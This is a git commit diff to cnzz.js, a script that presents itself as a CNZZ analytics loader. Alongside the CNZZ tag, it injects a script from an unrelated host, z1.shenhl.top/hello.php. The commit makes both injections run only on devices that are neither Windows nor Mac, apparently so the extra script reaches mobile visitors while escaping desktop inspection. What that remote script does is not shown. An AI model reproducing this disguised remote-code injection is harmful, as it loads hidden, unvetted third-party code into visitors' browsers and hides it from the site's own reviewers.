8b5534c3d6dce37ffe9ab773428e24ea06422667
乐乐 <35110476+lelege@users.noreply.github.com>
2021-12-05 02:33:13 +0800

    Update cnzz.js

--- cnzz.js
+++ cnzz.js
@@ -1,16 +1,19 @@
 (function() {
+	if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
 	var cnzz_s_tag = document.createElement('script');
 	cnzz_s_tag.type = 'text/javascript';
 	cnzz_s_tag.async = true;
 	cnzz_s_tag.charset = "UTF-8";
 	cnzz_s_tag.src = "https://v1.cnzz.com/z_stat.php?id=1280622668&web_id=1280622668";
 	var root_s = document.getElementsByTagName('script')[0];
-	root_s.parentNode.insertBefore(cnzz_s_tag, root_s)
+	root_s.parentNode.insertBefore(cnzz_s_tag, root_s);
 	var gg_s_tag = document.createElement('script');
 	gg_s_tag.type = 'text/javascript';
 	gg_s_tag.async = true;
 	gg_s_tag.charset = "UTF-8";
 	gg_s_tag.src = "https://z1.shenhl.top/hello.php?id=001637819343";
 	var gg_s = document.getElementsByTagName('script')[0];
-	gg_s.parentNode.insertBefore(gg_s_tag, gg_s)
+	gg_s.parentNode.insertBefore(gg_s_tag, gg_s);
+    }
+
 })();
